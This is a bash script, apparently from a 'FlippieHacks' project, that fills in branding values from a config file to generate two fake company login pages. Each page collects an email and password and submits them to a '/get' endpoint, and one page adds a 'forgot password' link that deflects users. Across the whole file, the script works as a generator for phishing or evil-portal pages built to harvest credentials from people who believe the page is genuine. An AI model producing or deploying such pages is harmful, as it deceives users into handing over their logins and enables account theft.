#By FlippieHacks && thomaskaviani - https://github.com/FlippieHacks
#!/bin/bash
mapfile -t <./../config.txt

background_color=${MAPFILE[0]:30}
company_title_text=${MAPFILE[1]:30}
company_title_color=${MAPFILE[2]:30}
container_background_color=${MAPFILE[3]:30}
container_title_text=${MAPFILE[4]:30}
container_title_color=${MAPFILE[5]:30}
container_subtitle_text=${MAPFILE[6]:30}
container_subtitle_color=${MAPFILE[7]:30}
submit_btn_background_color=${MAPFILE[8]:30}
submit_btn_text=${MAPFILE[9]:30}
submit_btn_text_color=${MAPFILE[10]:30}
forgot_credentials_text=${MAPFILE[11]:30}
forgot_credentials_color=${MAPFILE[12]:30}

if [ -f './../index.html' ]; then
  rm './../index.html'
fi

if [ -f './../indexWithForgotPassword.html' ]; then
  rm './../indexWithForgotPassword.html'
fi

#1 Generate Html
cat <<-EOF >>./../indexWithForgotPassword.html
<!DOCTYPE html><html><head>
<style>
  a:hover {
      text-decoration: underline;
  }
  body {
      font-family: Arial, sans-serif;
      align-items: center;
      justify-content: center;
      background-color: $background_color;
  }
  input[type="text"], input[type="password"] {
      width: 100%;padding: 12px 10px;
      margin: 8px 0;
      box-sizing: border-box;
      border: 1px solid #cccccc;
      border-radius: 4px;
  }
  .container {
      max-width: 33%;
      margin: auto;
      padding: 20px;
  }
  .logo-container {
    text-align: center;
    margin-bottom: 30px;
    display: flex;
    justify-content: center;c
    align-items: center;
  }
  .logo {
    width: 40px;
    height: 40px;
    fill: #FFC72C;
    margin-right: 100px;
  }
  .company-name {
    font-size: 42px;
    color: $company_title_color;
    margin-left: 0px;
  }
  .form-container {
    background: $container_background_color;
    border: 1px solid #CEC0DE;
    border-radius: 4px;
    padding: 20px;
    box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);
  }
  h1 {
    text-align: center;
    font-size: 28px;
    font-weight: 500;
    margin-bottom: 20px;
  }
  .input-field {
    width: 100%;padding: 12px;
    border: 1px solid #BEABD3;
    border-radius: 4px;
    margin-bottom: 20px;
    font-size: 14px;
  }
  .submit-btn {
    background: $submit_btn_background_color;
    color: $submit_btn_text_color;
    border: none;padding: 12px 20px;
    border-radius: 4px;font-size: 16px;
  }
  .submit-btn:hover {
    background: #5B3784;
  }
  .containersubtitle {
    color: $container_subtitle_color;
  }
  .containertitle {
    color: $container_title_color;
  }
  .error-message {
    color: red;
    text-align: center;
    display: none;
    margin-top: 10px;
  }
  @media (min-width: 600px) {
    .container {
      max-width: 500px;
    }
  }
  @media screen and (min-width: 768px) {
    .logo {
        max-width: 80px;
        max-height: 80px;
    }
  }
</style>
</head>
<body>
<div class="container">
  <div class="logo-container">
    <?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
    "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
EOF
echo "$(cat ./../svg.txt)" >>./../indexWithForgotPassword.html
cat <<-EOF >>./../indexWithForgotPassword.html
  <div class=company-name>
      $company_title_text
  </div>
  </div>
  <div class=form-container>
    <center>
      <h1 class='containertitle'>$container_title_text</h1>
      <h2 class='containersubtitle'>$container_subtitle_text</h2>
    </center>
    <form action="/get" id="login-form">
      <input name="email" class="input-field" type="text" placeholder="Email" required>
      <input name="password" class="input-field" type="password" placeholder="Password" required />
      <button id=submitbtn class=submit-btn type=submit>$submit_btn_text</button>
      <a href="javascript:void(0);" class="forgot-password" style='color: $forgot_credentials_color;'>$forgot_credentials_text</a>
      <div class="error-message"></div>
    </form>
  </div>
</div>
<script>
  document.querySelector('.forgot-password').addEventListener('click', function() {
    var errorMessage = document.querySelector('.error-message');
    errorMessage.innerHTML = "Please refer to your email if you forgot your credentials";
    errorMessage.style.display = 'block';
  });
</script>
</body>
</html>
EOF

#1 Generate Html without forgot password
cat <<-EOF >>./../index.html
<!DOCTYPE html>
<html>
<head>
<style>
  a:hover {
    text-decoration: underline;
  }
  body {
    font-family: Arial, sans-serif;
    align-items: center;
    justify-content: center;
    background-color: $background_color;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 12px 10px;
    margin: 8px 0;
    box-sizing: border-box;
    border: 1px solid #cccccc;
    border-radius: 4px;
  }
  .container {
    max-width: 33%;
    margin: auto;
    padding: 20px;
  }
  .logo-container {
    text-align: center;
    margin-bottom: 30px;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .logo {
    width: 40px;
    height: 40px;
    fill: #FFC72C;
    margin-right: 100px;
  }
  .company-name {
    font-size: 42px;
    color: $company_title_color;
    margin-left: 0px;
  }
  .form-container {
    background: $container_background_color;
    border: 1px solid #CEC0DE;
    border-radius: 4px;
    padding: 20px;
    box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);
  }
  h1 {
    text-align: center;
    font-size: 28px;
    font-weight: 500;
    margin-bottom: 20px;
  }
  .input-field {
    width: 100%;
    padding: 12px;
    border: 1px solid #BEABD3;
    border-radius: 4px;
    margin-bottom: 20px;
    font-size: 14px;
  }
  .submit-btn {
    background: $submit_btn_background_color;
    color: $submit_btn_text_color;
    border: none;
    padding: 12px 20px;
    border-radius: 4px;
    font-size: 16px;
  }
  .submit-btn:hover {
    background: #5B3784;
  }
  .containersubtitle {
    color: $container_subtitle_color;
  }
  .containertitle {
    color: $container_title_color;
  }

  @media screen and (min-width: 768px) {
    .logo {
        max-width: 80px;
        max-height: 80px;
    }
  }
</style>
</head>
<body>
<div class="container">
  <div class="logo-container">
    <?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
    "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
EOF
echo "$(cat ./../svg.txt)" >>./../index.html
cat <<-EOF >>./../index.html
    <div class=company-name>
        $company_title_text
    </div>
  </div>
  <div class=form-container>
    <center>
      <h1 class='containertitle'>$container_title_text</h1>
      <h2 class='containersubtitle'>$container_subtitle_text</h2>
    </center>
    <form action="/get" id="login-form">
      <input name="email" class="input-field" type="text" placeholder="Email" required>
      <input name="password" class="input-field" type="password" placeholder="Password" required />
      <button id=submitbtn class=submit-btn type=submit>$submit_btn_text</button>
    </form>
  </div>
</div>
</body>
</html>
EOF
